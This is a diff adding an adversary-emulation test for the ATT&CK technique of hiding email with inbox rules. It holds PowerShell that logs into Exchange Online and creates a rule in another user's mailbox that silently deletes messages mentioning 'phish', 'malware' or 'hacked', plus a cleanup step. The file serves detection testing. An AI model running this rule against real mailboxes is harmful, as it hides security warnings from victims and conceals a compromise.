@@ -1,0 +1,50 @@
+attack_technique: T1564.008
+display_name: 'Hide Artifacts: Email Hiding Rules'
+atomic_tests:
+- name: New-Inbox Rule to Hide E-mail in M365
+  auto_generated_guid: 30f7d3d1-78e2-4bf0-9efa-a175b5fce2a9
+  description: |
+    This test simulates a user adding an inbox rule in M365 to delete emails with specific keywords in email subject or body.
+     Reference: https://www.mandiant.com/sites/default/files/2021-09/rpt-fin4.pdf
+  supported_platforms:
+  - azure-ad 
+  input_arguments:
+    auth_username:
+      description: M365 Username
+      type: string
+      default: john@contoso.com
+    auth_password:
+      description: M365 Password
+      type: string
+      default: p4sswd
+    mail_rulename:
+      description: Name of the inbox rule.
+      type: string
+      default: default
+    target_mailbox:
+      description: Mailbox you are creating the rule in
+      type: string
+      default: jane@contoso.com
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      ExchangeOnlineManagement module must be installed.
+    prereq_command: |
+      try {if (Get-InstalledModule -Name ExchangeOnlineManagement -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
+    get_prereq_command: |
+      Install-Module -Name ExchangeOnlineManagement -Force
+  executor:
+    command: |
+      Import-Module ExchangeOnlineManagement
+      $password = ConvertTo-SecureString -String "#{auth_password}" -AsPlainText -Force
+      $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{auth_username}", $password
+      Connect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue
+      New-InboxRule -Mailbox #{target_mailbox} -Name #{mail_rulename} -SubjectOrBodyContainsWords ("phish","malware","hacked") -Confirm:$false -DeleteMessage:$true
+    cleanup_command: |
+      Import-Module ExchangeOnlineManagement
+      $password = ConvertTo-SecureString -String "#{auth_password}" -AsPlainText -Force
+      $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{auth_username}", $password
+      Connect-ExchangeOnline -Credential $credential
+      Remove-InboxRule -Mailbox #{target_mailbox} -Identity #{mail_rulename} -Confirm:$false
+    name: powershell
+    elevation_required: false
